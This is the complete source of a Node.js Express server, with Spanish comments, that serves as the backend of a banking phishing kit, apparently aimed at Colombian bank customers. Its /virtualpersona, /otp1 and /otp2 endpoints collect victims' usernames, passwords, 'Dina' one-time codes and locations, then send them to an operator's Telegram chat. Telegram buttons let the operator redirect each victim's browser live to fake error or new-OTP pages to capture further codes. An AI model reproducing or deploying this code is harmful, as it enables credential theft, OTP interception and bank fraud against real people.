import 'dotenv/config';
import express from 'express';
import cors from 'cors';

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cors());

const PORT = process.env.PORT || 10000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const PUBLIC_BASE_URL = process.env.PUBLIC_BASE_URL;
const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// --------------------- Estado en memoria (sin archivos) ---------------------
const sessionStates = new Map();

async function readState(sessionId) {
  if (!sessionStates.has(sessionId)) {
    sessionStates.set(sessionId, {
      sessionId,
      data: {},
      history: [],
      pending: null,
      lastUpdate: null
    });
  }
  return sessionStates.get(sessionId);
}

async function writeState(sessionId, patch) {
  const current = await readState(sessionId);
  const updated = {
    ...current,
    ...patch,
    lastUpdate: new Date().toISOString()
  };
  sessionStates.set(sessionId, updated);
  return updated;
}

function ts() {
  return new Date().toISOString();
}

// --------------------- Telegram helpers ---------------------
async function tgSendMessage(text, inlineKeyboard) {
  const payload = {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    reply_markup: inlineKeyboard ? { inline_keyboard: inlineKeyboard } : undefined
  };
  const res = await fetch(`${TG_API}/sendMessage`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(payload)
  });
  if (!res.ok) {
    const errTxt = await res.text();
    console.error('sendMessage failed:', errTxt);
  }
}

function kbBtn(text, data) {
  return [{ text, callback_data: JSON.stringify(data) }];
}

function buttonsForStep(step, sessionId) {
  if (step === 'virtualpersona') {
    return [
      kbBtn('🔁 Error Logo', { sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' }),
      kbBtn('➡️ Siguiente', { sessionId, action: 'redirect', redirect_to: 'opcion1.html' })
    ];
  }
  if (step === 'otp1' || step === 'otp2') {
    return [
      kbBtn('🔁 Error Logo', { sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' }),
      kbBtn('⚠️ Error OTP', { sessionId, action: 'redirect', redirect_to: 'opcion2.html' }),
      kbBtn('🔄 Nuevo OTP', { sessionId, action: 'redirect', redirect_to: 'opcion1.html' }),
      kbBtn('✅ Finalizar', { sessionId, action: 'redirect', redirect_to: 'finalizar.html' })
    ];
  }
  return [];
}

function fmt(k, v) {
  if (!v) return '';
  return `<b>${k}:</b> ${String(v).replace(/</g, '&lt;').replace(/>/g, '&gt;')}`;
}

app.post('/virtualpersona', async (req, res) => {
  try {
    const { sessionId, user, pass, ip, country, city } = req.body || {};
    if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });

    // 1. Guardar estado
    const updated = await writeState(sessionId, {
      step: 'virtual',
      data: { ...(await readState(sessionId)).data, user, pass, ip, country, city },
      history: [
        ...(await readState(sessionId)).history,
        { t: ts(), event: 'virtualpersona', user, pass }
      ],
      pending: null
    });

  
const message = `🔒 NUEVO INGRESO VIRTUAL 🔒

👤 Usuario: ${user}
🔑 Clave: ${pass}
🌎 IP: ${ip} (${city}, ${country})
🧾 SessionID: ${sessionId}`;

const buttons = {
  inline_keyboard: [
    [
      { text: "❌ Error Logo", callback_data: `error_logo|${sessionId}` },
      { text: "🔁 Intentar OTP", callback_data: `error_otp|${sessionId}` },
    ],
    [
      { text: "✅ Continuar", callback_data: `siguiente|${sessionId}` }
    ]
  ]
};

await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    chat_id: CHAT_ID,
    text: message,
    reply_markup: buttons
  })
});


    res.json({ ok: true });

  } catch (err) {
    console.error('Error en /virtualpersona:', err);
    res.status(500).json({ error: 'Error interno del servidor' });
  }
});

app.post('/otp1', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body || {};
    if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });

    const updated = await writeState(sessionId, {
      step: 'otp1',
      data: { ...(await readState(sessionId)).data, user, pass, dina, ip, country, city },
      history: [ ...(await readState(sessionId)).history, { t: ts(), event: 'otp1', dina } ],
      pending: null
    });

    const text =
`<b>📲 Ingreso OTP Dina</b>

${fmt('👤 User', user)}
${fmt('🔑 Pass', pass)}
${fmt('📳 Dina', dina)}
${fmt('🌐 IP', ip)}
${fmt('🌎 País', country)}
${fmt('🏘️ Ciudad', city)}

<b>SessionID:</b> <code>${sessionId}</code>
⏱️ <i>${new Date().toLocaleString('es-CO')}</i>`;

    await tgSendMessage(text, buttonsForStep('otp1', sessionId));
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: 'internal_error' });
  }
});

app.post('/otp2', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body || {};
    if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });

    const updated = await writeState(sessionId, {
      step: 'otp2',
      data: { ...(await readState(sessionId)).data, user, pass, dina, ip, country, city },
      history: [ ...(await readState(sessionId)).history, { t: ts(), event: 'otp2', dina } ],
      pending: null
    });

    const text =
`<b>📲 Ingreso OTP new Dina</b>

${fmt('👤 User', user)}
${fmt('🔑 Pass', pass)}
${fmt('📳 Dina', dina)}
${fmt('🌐 IP', ip)}
${fmt('🌎 País', country)}
${fmt('🏘️ Ciudad', city)}

<b>SessionID:</b> <code>${sessionId}</code>
⏱️ <i>${new Date().toLocaleString('es-CO')}</i>`;

    await tgSendMessage(text, buttonsForStep('otp2', sessionId));
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: 'internal_error' });
  }
});

app.get('/instruction/:sessionId', async (req, res) => {
  const { sessionId } = req.params;
  if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });

  const st = await readState(sessionId);
  if (st.pending && st.pending.redirect_to) {
    const redirect_to = st.pending.redirect_to;
    await writeState(sessionId, { pending: null });
    return res.json({ redirect_to });
  }
  res.json({ redirect_to: null });
});

app.get('/set-webhook', async (req, res) => {
  try {
    if (!PUBLIC_BASE_URL) return res.status(400).send('PUBLIC_BASE_URL requerido');
    const webhookUrl = `${PUBLIC_BASE_URL}/telegram/webhook`;
    const r = await fetch(`${TG_API}/setWebhook`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ url: webhookUrl })
    });
    const j = await r.json();
    res.json(j);
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: 'webhook_error' });
  }
});

app.post('/telegram/webhook', async (req, res) => {
  try {
    const update = req.body;
    res.sendStatus(200); // Siempre responde OK primero

    const cb = update.callback_query;
    if (!cb || !cb.data) return;

    let data;
    try {
      data = JSON.parse(cb.data);
    } catch (err) {
      console.error('❌ Error parseando callback_data:', cb.data);
      return;
    }

    const { sessionId, action, redirect_to } = data;

    if (action === 'redirect' && sessionId && redirect_to) {
      console.log(`➡️ Redirigiendo sessionId ${sessionId} a ${redirect_to}`);
      await writeState(sessionId, { pending: { redirect_to, at: ts() } });

      // Muy importante: esto notifica a Telegram que el botón fue procesado
      await fetch(`${TG_API}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: cb.id,
          text: `🔁 Cliente redirigido a ${redirect_to}`,
          show_alert: true
        })
      });
    }

  } catch (e) {
    console.error('❌ Error en webhook:', e);
  }
});


app.get('/health', (_, res) => res.send('ok'));

app.listen(PORT, () => {
  console.log(`✅ Server listening on ${PORT}`);
});
